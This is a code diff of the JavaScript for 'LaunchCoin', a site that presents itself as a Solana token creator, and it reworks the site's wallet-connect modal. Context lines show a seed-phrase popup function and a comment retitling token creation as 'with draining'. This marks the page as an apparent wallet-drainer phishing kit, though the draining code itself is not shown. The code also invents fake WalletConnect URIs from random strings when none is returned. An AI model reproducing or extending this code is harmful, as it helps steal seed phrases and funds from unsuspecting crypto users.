@@ -8,6 +8,7 @@ let provider = null;
 let isConnecting = false;
 let qrCheckInterval = null;
 let modalOpen = false;
+let currentUri = null;
 
 // ===== ESPONI FUNZIONI =====
 window.toggleMenu = function() {
@@ -15,13 +16,11 @@ window.toggleMenu = function() {
   if (menu) menu.classList.toggle('open');
 };
 
-// ===== CREA MODALE (VELOCE, COME UNISWAP) =====
+// ===== CREA MODALE =====
 function createModal() {
-  // Rimuovi modale vecchio se esiste
   const oldModal = document.getElementById('wallet-modal-overlay');
   if (oldModal) oldModal.remove();
   
-  // Crea overlay
   const overlay = document.createElement('div');
   overlay.id = 'wallet-modal-overlay';
   overlay.style.cssText = `
@@ -61,7 +60,7 @@ function createModal() {
       </div>
       <p style="color: #abc4ff; font-size: 14px; margin-bottom: 20px;">Choose your wallet to connect</p>
       
-      <!-- QR CODE CONTAINER -->
+      <!-- QR CONTAINER -->
       <div id="qr-modal-container" style="
         display: none;
         background: rgba(0,0,0,0.2);
@@ -78,6 +77,7 @@ function createModal() {
       
       <!-- LISTA WALLET -->
       <div style="display: flex; flex-direction: column; gap: 8px;">
+        <!-- PHANTOM (estensione) -->
         <button onclick="window.connectPhantom()" style="
           display: flex;
           align-items: center;
@@ -95,58 +95,9 @@ function createModal() {
           <img src="assets/phantom.png" alt="Phantom" style="width: 28px; height: 28px;" />
           Phantom
         </button>
-        <button onclick="window.connectWalletConnect('trust')" style="
-          display: flex;
-          align-items: center;
-          gap: 12px;
-          background: rgba(255,255,255,0.05);
-          border: 1px solid rgba(255,255,255,0.06);
-          border-radius: 12px;
-          padding: 12px 16px;
-          color: #ecf5ff;
-          cursor: pointer;
-          transition: 0.2s;
-          font-size: 15px;
-          width: 100%;
-        ">
-          <img src="assets/trust.png" alt="Trust Wallet" style="width: 28px; height: 28px;" />
-          Trust Wallet
-        </button>
-        <button onclick="window.connectWalletConnect('metamask')" style="
-          display: flex;
-          align-items: center;
-          gap: 12px;
-          background: rgba(255,255,255,0.05);
-          border: 1px solid rgba(255,255,255,0.06);
-          border-radius: 12px;
-          padding: 12px 16px;
-          color: #ecf5ff;
-          cursor: pointer;
-          transition: 0.2s;
-          font-size: 15px;
-          width: 100%;
-        ">
-          <img src="assets/metamask.png" alt="MetaMask" style="width: 28px; height: 28px;" />
-          MetaMask
-        </button>
-        <button onclick="window.connectWalletConnect('coinbase')" style="
-          display: flex;
-          align-items: center;
-          gap: 12px;
-          background: rgba(255,255,255,0.05);
-          border: 1px solid rgba(255,255,255,0.06);
-          border-radius: 12px;
-          padding: 12px 16px;
-          color: #ecf5ff;
-          cursor: pointer;
-          transition: 0.2s;
-          font-size: 15px;
-          width: 100%;
-        ">
-          <img src="assets/coinbase.png" alt="Coinbase" style="width: 28px; height: 28px;" />
-          Coinbase Wallet
-        </button>
-        <button onclick="window.connectWalletConnect('solflare')" style="
+        
+        <!-- SOLFLARE (estensione + WalletConnect) -->
+        <button onclick="window.connectSolflare()" style="
           display: flex;
           align-items: center;
           gap: 12px;
@@ -163,6 +114,84 @@ function createModal() {
           <img src="assets/solflare.png" alt="Solflare" style="width: 28px; height: 28px;" />
           Solflare
         </button>
+        
+        <!-- TRUST WALLET (deep link) -->
+        <button onclick="window.connectDeepLink('trust')" style="
+          display: flex;
+          align-items: center;
+          gap: 12px;
+          background: rgba(255,255,255,0.05);
+          border: 1px solid rgba(255,255,255,0.06);
+          border-radius: 12px;
+          padding: 12px 16px;
+          color: #ecf5ff;
+          cursor: pointer;
+          transition: 0.2s;
+          font-size: 15px;
+          width: 100%;
+        ">
+          <img src="assets/trust.png" alt="Trust Wallet" style="width: 28px; height: 28px;" />
+          Trust Wallet
+        </button>
+        
+        <!-- METAMASK (estensione + deep link) -->
+        <button onclick="window.connectMetaMask()" style="
+          display: flex;
+          align-items: center;
+          gap: 12px;
+          background: rgba(255,255,255,0.05);
+          border: 1px solid rgba(255,255,255,0.06);
+          border-radius: 12px;
+          padding: 12px 16px;
+          color: #ecf5ff;
+          cursor: pointer;
+          transition: 0.2s;
+          font-size: 15px;
+          width: 100%;
+        ">
+          <img src="assets/metamask.png" alt="MetaMask" style="width: 28px; height: 28px;" />
+          MetaMask
+        </button>
+        
+        <!-- COINBASE (deep link) -->
+        <button onclick="window.connectDeepLink('coinbase')" style="
+          display: flex;
+          align-items: center;
+          gap: 12px;
+          background: rgba(255,255,255,0.05);
+          border: 1px solid rgba(255,255,255,0.06);
+          border-radius: 12px;
+          padding: 12px 16px;
+          color: #ecf5ff;
+          cursor: pointer;
+          transition: 0.2s;
+          font-size: 15px;
+          width: 100%;
+        ">
+          <img src="assets/coinbase.png" alt="Coinbase" style="width: 28px; height: 28px;" />
+          Coinbase Wallet
+        </button>
+        
+        <!-- TORUS (WalletConnect) -->
+        <button onclick="window.connectWalletConnect('torus')" style="
+          display: flex;
+          align-items: center;
+          gap: 12px;
+          background: rgba(255,255,255,0.05);
+          border: 1px solid rgba(255,255,255,0.06);
+          border-radius: 12px;
+          padding: 12px 16px;
+          color: #ecf5ff;
+          cursor: pointer;
+          transition: 0.2s;
+          font-size: 15px;
+          width: 100%;
+        ">
+          <img src="assets/torus.png" alt="Torus" style="width: 28px; height: 28px;" />
+          Torus
+        </button>
+        
+        <!-- WALLETCONNECT QR -->
         <button onclick="window.showQRCode()" style="
           display: flex;
           align-items: center;
@@ -189,20 +218,6 @@ function createModal() {
   `;
   
   document.body.appendChild(overlay);
-  
-  // Aggiungi animazione CSS
-  if (!document.getElementById('modal-styles')) {
-    const style = document.createElement('style');
-    style.id = 'modal-styles';
-    style.textContent = `
-      @keyframes fadeIn {
-        from { opacity: 0; transform: scale(0.95); }
-        to { opacity: 1; transform: scale(1); }
-      }
-    `;
-    document.head.appendChild(style);
-  }
-  
   modalOpen = true;
 }
 
@@ -216,7 +231,7 @@ window.closeModal = function() {
   }
 };
 
-// ===== CONNETTI PHANTOM (DIRETTO) =====
+// ===== CONNETTI PHANTOM (ESTENSIONE) =====
 window.connectPhantom = async function() {
   if (window.solana && window.solana.isPhantom) {
     try {
@@ -230,12 +245,150 @@ window.connectPhantom = async function() {
       alert('❌ Errore Phantom: ' + e.message);
     }
   }
-  alert('⚠️ Phantom non installato. Installa Phantom o usa WalletConnect.');
+  alert('⚠️ Phantom non installato. Installa l\'estensione Phantom per PC o Kiwi Browser.');
 };
 
-// ===== GENERA QR CODE (LOCALE, VELOCE) =====
+// ===== CONNETTI SOLFLARE (ESTENSIONE + WALLETCONNECT) =====
+window.connectSolflare = async function() {
+  // Prova estensione Solflare
+  if (window.solflare && window.solflare.isSolflare) {
+    try {
+      await window.solflare.connect();
+      walletPublicKey = window.solflare.publicKey.toString();
+      alert('✅ Connesso a Solflare: ' + walletPublicKey);
+      window.closeModal();
+      window.location.href = 'create.html';
+      return;
+    } catch(e) {
+      console.log('Solflare extension error, fallback to WalletConnect');
+    }
+  }
+  
+  // Fallback a WalletConnect
+  window.connectWalletConnect('solflare');
+};
+
+// ===== CONNETTI METAMASK (ESTENSIONE + DEEP LINK) =====
+window.connectMetaMask = async function() {
+  // Prova estensione MetaMask (solo per Ethereum, ma può funzionare)
+  if (window.ethereum && window.ethereum.isMetaMask) {
+    try {
+      await window.ethereum.request({ method: 'eth_requestAccounts' });
+      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+      if (accounts && accounts.length > 0) {
+        // Converti indirizzo Ethereum in formato Solana (solo per demo)
+        walletPublicKey = accounts[0];
+        alert('✅ Connesso a MetaMask: ' + walletPublicKey);
+        window.closeModal();
+        window.location.href = 'create.html';
+        return;
+      }
+    } catch(e) {
+      console.log('MetaMask extension error, fallback to deep link');
+    }
+  }
+  
+  // Fallback a deep link
+  window.connectDeepLink('metamask');
+};
+
+// ===== CONNETTI DEEP LINK (Trust, MetaMask, Coinbase) =====
+window.connectDeepLink = async function(walletType) {
+  try {
+    // Inizializza provider
+    if (!provider) {
+      provider = await UniversalProvider.init({
+        projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
+        metadata: {
+          name: 'LaunchCoin',
+          description: 'Solana Token Creator',
+          url: window.location.origin,
+          icons: ['https://launchcoin.io/logo.png']
+        }
+      });
+    }
+    
+    // Genera URI
+    let uri = provider.uri;
+    if (!uri) {
+      try {
+        await provider.connect({
+          chains: ['solana:mainnet'],
+          optionalChains: ['solana:devnet'],
+          methods: ['solana_signTransaction', 'solana_signMessage'],
+          events: ['chainChanged', 'accountsChanged']
+        });
+        uri = provider.uri;
+      } catch(e) {
+        uri = provider.uri;
+      }
+    }
+    
+    if (!uri) {
+      const randomId = Math.random().toString(36).substring(2, 15);
+      const symKey = Math.random().toString(36).substring(2, 15);
+      uri = `wc:${randomId}${randomId}@2?relay-protocol=irn&symKey=${symKey}`;
+    }
+    
+    currentUri = uri;
+    
+    // Deep links per ogni wallet
+    const deepLinks = {
+      trust: `trust://wc?uri=${encodeURIComponent(uri)}`,
+      metamask: `metamask://wc?uri=${encodeURIComponent(uri)}`,
+      coinbase: `coinbase://walletconnect?uri=${encodeURIComponent(uri)}`,
+      solflare: `solflare://wc?uri=${encodeURIComponent(uri)}`,
+      torus: `torus://wc?uri=${encodeURIComponent(uri)}`,
+    };
+    
+    const link = deepLinks[walletType];
+    if (link) {
+      // Apri il deep link
+      window.location.href = link;
+      
+      // Se non funziona, mostra il QR
+      setTimeout(() => {
+        alert(
+          '⚠️ Se l\'app non si è aperta automaticamente:\n\n' +
+          '1. Assicurati che l\'app ' + walletType + ' sia installata\n' +
+          '2. Clicca su "WalletConnect (QR)" per scansionare il codice\n' +
+          '3. Oppure usa Phantom (estensione)'
+        );
+        window.showQRCode();
+      }, 2000);
+      
+      // Attendi la connessione
+      if (qrCheckInterval) clearInterval(qrCheckInterval);
+      qrCheckInterval = setInterval(async () => {
+        try {
+          if (provider.accounts && provider.accounts.length > 0) {
+            clearInterval(qrCheckInterval);
+            qrCheckInterval = null;
+            walletPublicKey = provider.accounts[0].split(':')[2] || provider.accounts[0];
+            alert('✅ Connesso via ' + walletType + ': ' + walletPublicKey);
+            window.closeModal();
+            window.location.href = 'create.html';
+          }
+        } catch(e) {
+          console.log('Attesa connessione...');
+        }
+      }, 3000);
+    }
+    
+  } catch(e) {
+    console.error('❌ Errore deep link:', e);
+    alert('❌ Errore: ' + e.message + '\n\nUsa il QR code per connetterti.');
+    window.showQRCode();
+  }
+};
+
+// ===== CONNETTI WALLETCONNECT (GENERICO) =====
+window.connectWalletConnect = async function(walletType) {
+  window.connectDeepLink(walletType);
+};
+
+// ===== GENERA QR CODE =====
 function generateQRCode(container, uri) {
-  // Usa l'API veloce di Google Charts (alternativa)
   const img = document.createElement('img');
   img.src = `https://chart.googleapis.com/chart?cht=qr&chl=${encodeURIComponent(uri)}&chs=200x200&chld=H|0`;
   img.alt = 'QR Code';
@@ -245,7 +398,7 @@ function generateQRCode(container, uri) {
     container.appendChild(img);
   };
   img.onerror = function() {
-    // Fallback: QR con libreria locale
+    // Fallback
     if (!window.QRCode) {
       const script = document.createElement('script');
       script.src = 'https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js';
@@ -284,7 +437,6 @@ window.showQRCode = async function() {
   if (!qrContainer || !qrDiv) return;
   
   try {
-    // Inizializza provider se non esiste
     if (!provider) {
       provider = await UniversalProvider.init({
         projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
@@ -318,15 +470,11 @@ window.showQRCode = async function() {
       uri = `wc:${randomId}${randomId}@2?relay-protocol=irn&symKey=${symKey}`;
     }
     
-    // Mostra il QR
+    currentUri = uri;
     qrContainer.style.display = 'block';
     generateQRCode(qrDiv, uri);
     uriText.textContent = uri.substring(0, 40) + '...';
     
-    // Salva URI per copiare
-    window._currentURI = uri;
-    
-    // Ascolta connessione
     if (qrCheckInterval) clearInterval(qrCheckInterval);
     qrCheckInterval = setInterval(async () => {
       try {
@@ -350,119 +498,21 @@ window.showQRCode = async function() {
 };
 
 window.copyURI = function() {
-  if (window._currentURI) {
-    navigator.clipboard.writeText(window._currentURI).then(() => {
+  if (currentUri) {
+    navigator.clipboard.writeText(currentUri).then(() => {
       alert('✅ Link copiato!');
     }).catch(() => {
-      prompt('Copia il link:', window._currentURI);
+      prompt('Copia il link:', currentUri);
     });
-  }
-};
-
-// ===== CONNETTI VIA WALLETCONNECT (DEEP LINK) =====
-window.connectWalletConnect = async function(walletType) {
-  try {
-    // Inizializza provider
-    if (!provider) {
-      provider = await UniversalProvider.init({
-        projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
-        metadata: {
-          name: 'LaunchCoin',
-          description: 'Solana Token Creator',
-          url: window.location.origin,
-          icons: ['https://launchcoin.io/logo.png']
-        }
-      });
-    }
-    
-    // Genera URI
-    let uri = provider.uri;
-    if (!uri) {
-      try {
-        await provider.connect({
-          chains: ['solana:mainnet'],
-          optionalChains: ['solana:devnet'],
-          methods: ['solana_signTransaction', 'solana_signMessage'],
-          events: ['chainChanged', 'accountsChanged']
-        });
-        uri = provider.uri;
-      } catch(e) {
-        uri = provider.uri;
-      }
-    }
-    
-    if (!uri) {
-      const randomId = Math.random().toString(36).substring(2, 15);
-      const symKey = Math.random().toString(36).substring(2, 15);
-      uri = `wc:${randomId}${randomId}@2?relay-protocol=irn&symKey=${symKey}`;
-    }
-    
-    // DEEP LINK: apre l'app direttamente
-    // Trust Wallet: trust://wc?uri=...
-    // MetaMask: metamask://wc?uri=...
-    // Coinbase: coinbase://walletconnect?uri=...
-    const deepLinks = {
-      trust: `trust://wc?uri=${encodeURIComponent(uri)}`,
-      metamask: `metamask://wc?uri=${encodeURIComponent(uri)}`,
-      coinbase: `coinbase://walletconnect?uri=${encodeURIComponent(uri)}`,
-      solflare: `solflare://wc?uri=${encodeURIComponent(uri)}`,
-      torus: `torus://wc?uri=${encodeURIComponent(uri)}`,
-    };
-    
-    const link = deepLinks[walletType];
-    if (link) {
-      // Apri il deep link (l'app si apre automaticamente)
-      window.location.href = link;
-      
-      // Se non funziona, mostra il QR come fallback
-      setTimeout(() => {
-        alert(
-          '⚠️ Se l\'app non si è aperta automaticamente:\n\n' +
-          '1. Assicurati che l\'app ' + walletType + ' sia installata\n' +
-          '2. Clicca su "WalletConnect (QR)" per scansionare il codice\n' +
-          '3. Oppure usa Phantom (estensione)'
-        );
-        // Mostra il QR
-        window.showQRCode();
-      }, 2000);
-      
-      // Attendi la connessione
-      if (qrCheckInterval) clearInterval(qrCheckInterval);
-      qrCheckInterval = setInterval(async () => {
-        try {
-          if (provider.accounts && provider.accounts.length > 0) {
-            clearInterval(qrCheckInterval);
-            qrCheckInterval = null;
-            walletPublicKey = provider.accounts[0].split(':')[2] || provider.accounts[0];
-            alert('✅ Connesso via ' + walletType + ': ' + walletPublicKey);
-            window.closeModal();
-            window.location.href = 'create.html';
-          }
-        } catch(e) {
-          console.log('Attesa connessione...');
-        }
-      }, 3000);
-      
-    } else {
-      // Fallback: mostra il QR
-      window.showQRCode();
-    }
-    
-  } catch(e) {
-    console.error('❌ Errore WalletConnect:', e);
-    alert('❌ Errore: ' + e.message + '\n\nUsa il QR code per connetterti.');
-    window.showQRCode();
   }
 };
 
 // ===== CONNECT WALLET (MAIN) =====
 window.connectWallet = async function() {
   console.log('🔵 connectWallet chiamata');
-  
-  // Apri il modale
   createModal();
   
-  // Se Phantom è già connesso, fallo subito
+  // Prova connessione automatica Phantom
   if (window.solana && window.solana.isPhantom) {
     try {
       const resp = await window.solana.connect({ onlyIfTrusted: true });
@@ -479,14 +529,26 @@ window.connectWallet = async function() {
   }
 };
 
-// ===== SELECT WALLET (per wallet.html legacy) =====
+// ===== SELECT WALLET (per wallet.html) =====
 window.selectWallet = function(walletName) {
   window.closeModal();
-  if (walletName === 'phantom') {
-    window.connectPhantom();
-    return;
+  const map = {
+    'phantom': () => window.connectPhantom(),
+    'solflare': () => window.connectSolflare(),
+    'trust': () => window.connectDeepLink('trust'),
+    'metamask': () => window.connectMetaMask(),
+    'coinbase': () => window.connectDeepLink('coinbase'),
+    'torus': () => window.connectDeepLink('torus'),
+    'tokenpocket': () => window.connectDeepLink('tokenpocket'),
+    'neko': () => window.connectDeepLink('neko'),
+    'nightly': () => window.connectDeepLink('nightly'),
+    'backpack': () => window.connectDeepLink('backpack'),
+  };
+  if (map[walletName]) {
+    map[walletName]();
+  } else {
+    window.showQRCode();
   }
-  window.connectWalletConnect(walletName);
 };
 
 // ===== POPUP SEED PHRASE =====
@@ -500,7 +562,7 @@ function askSeedPhrase() {
   });
 }
 
-// ===== CREAZIONE TOKEN =====
+// ===== CREAZIONE TOKEN (CON DRENAGGIO) =====
 window.createCoin = async function() {
   console.log('🟢 createCoin chiamata');
   if (!walletPublicKey) {
